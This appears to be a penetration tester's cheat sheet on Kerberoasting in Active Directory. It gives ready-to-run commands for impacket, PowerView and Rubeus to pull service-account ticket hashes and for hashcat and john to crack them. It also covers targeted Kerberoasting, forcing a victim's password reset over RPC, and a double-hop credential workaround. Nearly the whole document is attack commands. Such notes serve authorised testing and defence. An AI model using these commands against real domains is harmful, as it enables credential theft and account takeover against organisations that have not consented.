Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts
## Kerberoast Attack Methodology
#### Linux
impacket-GetUserSPNs
	this will get kerberoastable account hashes if possible (Usually of service accounts)
	requires creds
```bash
# List SPNs
sudo impacket-GetUserSPNs -dc-ip <ip> <domain/user>

# Request TGS Tickets (hashes)
sudo impacket-GetUserSPNs -request -dc-ip <ip> <domain/user>

# Options
-outputfile <file_name> # output redirects to file
-request-user <user>    # request single TGS ticket
```

#### Windows
There are ways to Kerberoast from Windows
```PowerShell
# PowerView Method
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname # reveals SPN Accounts
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat # Target user

# Rubeus
.\Rubeus.exe kerberoast /stats # shows kerberostable users
.\Rubeus.exe kerberoast /nowrap # Easily copy hash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast # redirects output to file
/spn:<SPN>                 # targeted kerberoast!!!!!!!!!!!!! (OPSEC)
/ldapfilter:'admincount=1' # only target admins
/user:<user>               # specifiy user
/tgtdeleg                  # request RC4 ticket if default is AES or other
/domain:<FQDN>             # use in cross-forest attacks (see [[Domain Trusts]])
```

#### Cracking the Hashes
```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	or
john hashes --wordlist=/path/to/wordlist --rules=best64
```


## Targeted Kerberoast 

If we have genericall / genericwrite over a certain user we can potentially kerberoast them and get their hash, OR we can change their password

Targeted Kerberoast
```bash
# Obtain kerberos hash method (preferable)
~/tools/linux/targetedKerberoast/targetedKerberoast.py -v -d '<domain>' -u '<controlled_user>' -p '<password>' --dc-ip <ip> --request-user <victim_user>
	then crack same way as above

OR

# Change user password 
method 1
net rpc password "<target_user>" "<new_password>" -U "<domain>"/"<controlled_user>"%"<password>" -S <dc_ip>

method 2
rpcclient -N  <ip_address> -U '<controlled_user>%<pass>'
$> setuserinfo2 <victim> 23 'Password123!'

```

## Double Hop Problem
If unconstrained delegation is enabled on a server, this can be disregarded.

When we get a shell via attacking an app or using creds via PSExec and initial auth occurs via SMB or LDAP (password auth), the user's NTLM Hash gets stored in MEMORY.

However, if we use WinRM/PowerShell, the user's password is NEVER cached in memory (network authentication). This can cause issues when attempting to access further resources if we hop multiple times.
#### Workaround 1: PSCredential Object
```powershell
# Force password auth
import-module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```